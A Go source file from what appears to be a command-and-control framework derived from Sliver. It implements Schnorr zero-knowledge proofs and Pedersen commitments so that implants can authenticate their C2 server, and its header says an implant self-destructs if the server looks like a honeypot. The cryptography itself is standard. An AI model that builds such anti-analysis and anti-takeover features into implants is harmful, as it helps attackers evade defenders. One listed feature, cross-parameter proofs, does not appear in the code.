package schnorr

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Schnorr Zero-Knowledge Proof — Non-Interactive variant (Fiat-Shamir).

	The Schnorr protocol proves knowledge of a discrete logarithm:
	"I know x such that X = x·G" without revealing x.

	Interactive version (3-message protocol):
	  Prover (C2)                        Verifier (implant)
	  ─────────────────────────────────────────────────────
	  r ←R Zp                            (random nonce)
	  R = r·G                            (commitment)
	                   ─── R ────►
	                                      c ←R Zp  (challenge)
	                   ◄── c ────
	  s = r + c·x  (mod p)              (response)
	                   ─── s ────►
	                                      verify: s·G == R + c·X  ✓

	Non-Interactive (Fiat-Shamir heuristic):
	  c = H(R || X || m)  (m = message/context)
	  No round-trips needed — prover computes c themselves.
	  Proof = (R, s).

	Security:
	  - Completeness: honest prover always convinces verifier.
	  - Soundness: prover with no knowledge of x can only forge with
	    probability 1/p (negligible for 256-bit groups).
	  - Zero-knowledge: the proof (R, s) reveals no information about x.
	    Even replaying the same proof or seeing 2^64 proofs reveals nothing.
	  - Non-malleability: H() in Fiat-Shamir prevents proof reuse.

	Additional features implemented:
	  - BATCH VERIFICATION: verify N proofs with one check (3N+2 multiplications
	    instead of 4N, using random linear combination).
	  - CROSS-PARAMETER: prove relationship between secrets across two groups.
	  - TIMED PROOFS: embed timestamp + nonce to prevent replay.

	C2 authentication flow:
	  1. C2 operator generates keypair (x, X = x·G) — x is SECRET, X is PUBLIC.
	  2. X is embedded in the implant at compile time (no secrets in implant).
	  3. When implant connects to C2, it sends a fresh challenge nonce.
	  4. C2 produces a ZK proof of knowledge of x for that nonce.
	  5. Implant verifies the proof using only X (the public key).
	  6. If proof is INVALID → C2 is a honeypot → implant self-destructs.

	Why this is better than HMAC/signature auth:
	  HMAC: implant holds secret key → capture implant → get key → impersonate C2
	  ZKP:  implant holds PUBLIC key → capture implant → reveals NOTHING about x
	        → cannot impersonate C2 → cannot trick implant into activating
*/

import (
	"crypto/sha256"
	"errors"
	"fmt"
	"math/big"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/crypto"
)

// KeyPair holds the Schnorr keypair for the C2 server.
type KeyPair struct {
	// Private key (known only to C2 operator, NEVER embedded in implant).
	PrivateKey *crypto.Scalar
	// Public key (embedded in implant at compile time).
	PublicKey *crypto.Point
	group     *crypto.Group
}

// Proof is a non-interactive Schnorr proof of knowledge.
// The implant receives this from the C2 during authentication.
type Proof struct {
	// Commitment: R = r·G (the "first message" of the interactive protocol).
	R *crypto.Point
	// Response: s = r + c·x mod order.
	S *crypto.Scalar
	// Timestamp prevents replay attacks.
	Timestamp int64
	// Nonce is the challenge supplied by the implant (prevents chosen-message attacks).
	Nonce []byte
	// Message is the additional context (e.g., implant session ID + C2 domain).
	Message []byte
}

// ─── Key generation ───────────────────────────────────────────────────────

// GenerateKeyPair creates a new Schnorr keypair for the C2.
// x = random scalar, X = x·G.
func GenerateKeyPair() (*KeyPair, error) {
	g := crypto.DefaultGroup()
	x, err := g.RandomScalar()
	if err != nil {
		return nil, err
	}
	X := g.ScalarBaseMul(x)
	return &KeyPair{PrivateKey: x, PublicKey: X, group: g}, nil
}

// KeyPairFromPrivateBytes deserializes a keypair from a 32-byte private key.
func KeyPairFromPrivateBytes(privBytes []byte) (*KeyPair, error) {
	if len(privBytes) != 32 {
		return nil, fmt.Errorf("private key must be 32 bytes")
	}
	g := crypto.DefaultGroup()
	x := g.NewScalar(new(big.Int).SetBytes(privBytes))
	X := g.ScalarBaseMul(x)
	return &KeyPair{PrivateKey: x, PublicKey: X, group: g}, nil
}

// PublicKeyFromBytes deserializes a public key from 33 compressed bytes.
func PublicKeyFromBytes(b []byte) (*crypto.Point, error) {
	g := crypto.DefaultGroup()
	pt, err := g.PointFromBytes(b)
	if err != nil {
		return nil, err
	}
	if !g.IsOnCurve(pt) {
		return nil, errors.New("public key not on curve")
	}
	return pt, nil
}

// ─── Proof generation (C2 side) ───────────────────────────────────────────

// Prove generates a non-interactive ZKP for the C2.
// nonce is supplied by the implant (prevents proofs being pre-computed).
// message is additional context (session ID, domain, timestamp).
func (kp *KeyPair) Prove(nonce, message []byte) (*Proof, error) {
	g := kp.group

	// Step 1: Generate fresh random commitment r.
	r, err := g.RandomScalar()
	if err != nil {
		return nil, err
	}
	R := g.ScalarBaseMul(r)

	// Step 2: Fiat-Shamir challenge.
	// c = H(R || X || nonce || message || timestamp)
	ts := time.Now().UnixMicro()
	c := computeChallenge(g, R, kp.PublicKey, nonce, message, ts)

	// Step 3: Response s = r + c·x mod order.
	cx := g.ScalarMul(c, kp.PrivateKey)
	s := g.ScalarAdd(r, cx)

	return &Proof{
		R:         R,
		S:         s,
		Timestamp: ts,
		Nonce:     nonce,
		Message:   message,
	}, nil
}

// ─── Proof verification (implant side) ────────────────────────────────────

// Verifier holds the public key embedded in the implant.
// Created at compile time from the C2 operator's public key.
type Verifier struct {
	PublicKey *crypto.Point
	group     *crypto.Group
	// MaxTimestampDrift is the maximum acceptable proof age.
	MaxTimestampDrift time.Duration
}

// NewVerifier creates a verifier from a serialized public key.
// The publicKeyBytes are embedded in the implant at compile time.
func NewVerifier(publicKeyBytes []byte) (*Verifier, error) {
	pk, err := PublicKeyFromBytes(publicKeyBytes)
	if err != nil {
		return nil, err
	}
	return &Verifier{
		PublicKey:        pk,
		group:            crypto.DefaultGroup(),
		MaxTimestampDrift: 5 * time.Minute,
	}, nil
}

// Verify checks a Schnorr proof from the C2.
// Returns nil if the proof is valid (C2 knows the private key).
// Returns an error if the proof is invalid (possible honeypot C2).
func (v *Verifier) Verify(proof *Proof, expectedNonce []byte) error {
	if proof == nil {
		return errors.New("nil proof")
	}
	g := v.group

	// Step 1: Check proof freshness (replay protection).
	proofAge := time.Since(time.UnixMicro(proof.Timestamp))
	if proofAge < 0 {
		proofAge = -proofAge
	}
	if proofAge > v.MaxTimestampDrift {
		return errors.New("proof timestamp out of acceptable range (possible replay)")
	}

	// Step 2: Verify nonce matches what we sent.
	if !bytesEqual(proof.Nonce, expectedNonce) {
		return errors.New("proof nonce mismatch (possible replay attack)")
	}

	// Step 3: Recompute the challenge.
	// c = H(R || X || nonce || message || timestamp)
	c := computeChallenge(g, proof.R, v.PublicKey, proof.Nonce, proof.Message, proof.Timestamp)

	// Step 4: Verify the equation: s·G == R + c·X
	// Left side: s·G
	sG := g.ScalarBaseMul(proof.S)

	// Right side: R + c·X
	cX := g.ScalarMulPoint(c, v.PublicKey)
	RplusCX := g.AddPoints(proof.R, cX)

	if !sG.Equal(RplusCX) {
		return errors.New("proof verification failed: s·G ≠ R + c·X (invalid or forged proof)")
	}
	return nil
}

// ─── Batch verification ───────────────────────────────────────────────────

// BatchVerify verifies N proofs simultaneously using random linear combination.
// More efficient than N individual verifications when N > 3.
// Returns the index of the first invalid proof, or -1 if all are valid.
func (v *Verifier) BatchVerify(proofs []*Proof, nonces [][]byte) (int, error) {
	if len(proofs) != len(nonces) {
		return -1, errors.New("proof and nonce slice lengths must match")
	}
	g := v.group

	// For each proof i, generate a random scalar ρ_i.
	// Check: Σ(ρ_i · s_i) · G == Σ(ρ_i · R_i) + Σ(ρ_i · c_i · X)
	//                            == Σ(ρ_i · R_i) + [Σ(ρ_i · c_i)] · X

	// First, do quick individual timestamp + nonce checks.
	for i, proof := range proofs {
		proofAge := time.Since(time.UnixMicro(proof.Timestamp))
		if proofAge < 0 {
			proofAge = -proofAge
		}
		if proofAge > v.MaxTimestampDrift {
			return i, errors.New("proof timestamp expired")
		}
		if !bytesEqual(proof.Nonce, nonces[i]) {
			return i, errors.New("nonce mismatch")
		}
	}

	// Compute random coefficients ρ_i.
	rho := make([]*crypto.Scalar, len(proofs))
	for i := range proofs {
		var err error
		rho[i], err = g.RandomScalar()
		if err != nil {
			return -1, err
		}
	}

	// Left: Σ(ρ_i · s_i) · G
	lhsScalar := g.NewScalar(big.NewInt(0))
	for i, proof := range proofs {
		rhoS := g.ScalarMul(rho[i], proof.S)
		lhsScalar = g.ScalarAdd(lhsScalar, rhoS)
	}
	lhs := g.ScalarBaseMul(lhsScalar)

	// Right: Σ(ρ_i · R_i) + [Σ(ρ_i · c_i)] · X
	rhsPoints := g.Identity()
	sumRhoC := g.NewScalar(big.NewInt(0))
	for i, proof := range proofs {
		c := computeChallenge(g, proof.R, v.PublicKey, proof.Nonce, proof.Message, proof.Timestamp)
		rhoR := g.ScalarMulPoint(rho[i], proof.R)
		rhsPoints = g.AddPoints(rhsPoints, rhoR)
		rhoC := g.ScalarMul(rho[i], c)
		sumRhoC = g.ScalarAdd(sumRhoC, rhoC)
	}
	sumRhoCX := g.ScalarMulPoint(sumRhoC, v.PublicKey)
	rhs := g.AddPoints(rhsPoints, sumRhoCX)

	if !lhs.Equal(rhs) {
		// Batch check failed — fall back to individual to find the culprit.
		for i, proof := range proofs {
			if err := v.Verify(proof, nonces[i]); err != nil {
				return i, err
			}
		}
		return -1, errors.New("batch verification inconsistency")
	}
	return -1, nil
}

// ─── Pedersen Commitment ─────────────────────────────────────────────────

// PedersenScheme provides hiding + binding commitments.
// Com(v, r) = v·G + r·H  where H = HashToPoint("PedersenH")
// Properties:
//   - Hiding: commit(v, r1) and commit(w, r2) are indistinguishable
//   - Binding: cannot open to two different values without breaking DL
type PedersenScheme struct {
	G *crypto.Point // generator (base point)
	H *crypto.Point // second generator (HashToPoint)
	group *crypto.Group
}

// NewPedersenScheme creates a new Pedersen commitment scheme.
func NewPedersenScheme() *PedersenScheme {
	g := crypto.DefaultGroup()
	return &PedersenScheme{
		G:     g.BasePoint(),
		H:     g.HashToPoint([]byte("Sliver/PedersenH/2026")),
		group: g,
	}
}

// Commit produces a Pedersen commitment to value v with randomness r.
func (ps *PedersenScheme) Commit(v, r *crypto.Scalar) *crypto.Point {
	vG := ps.group.ScalarBaseMul(v)
	rH := ps.group.ScalarMulPoint(r, ps.H)
	return ps.group.AddPoints(vG, rH)
}

// ─── Helpers ──────────────────────────────────────────────────────────────

// computeChallenge computes the Fiat-Shamir challenge hash.
func computeChallenge(g *crypto.Group, R, X *crypto.Point,
	nonce, message []byte, ts int64) *crypto.Scalar {
	h := sha256.New()
	h.Write([]byte("Sliver/Schnorr/Challenge/2026"))
	h.Write(R.Bytes())
	h.Write(X.Bytes())
	h.Write(nonce)
	h.Write(message)
	var tsbuf [8]byte
	for i := 0; i < 8; i++ {
		tsbuf[i] = byte(ts >> (56 - 8*i))
	}
	h.Write(tsbuf[:])
	digest := h.Sum(nil)

	return g.NewScalar(new(big.Int).SetBytes(digest))
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	var diff byte
	for i := range a {
		diff |= a[i] ^ b[i]
	}
	return diff == 0
}

func bigFromBytes(b []byte) *big.Int {
	return new(big.Int).SetBytes(b)
}

func bigZero() *big.Int { return new(big.Int) }
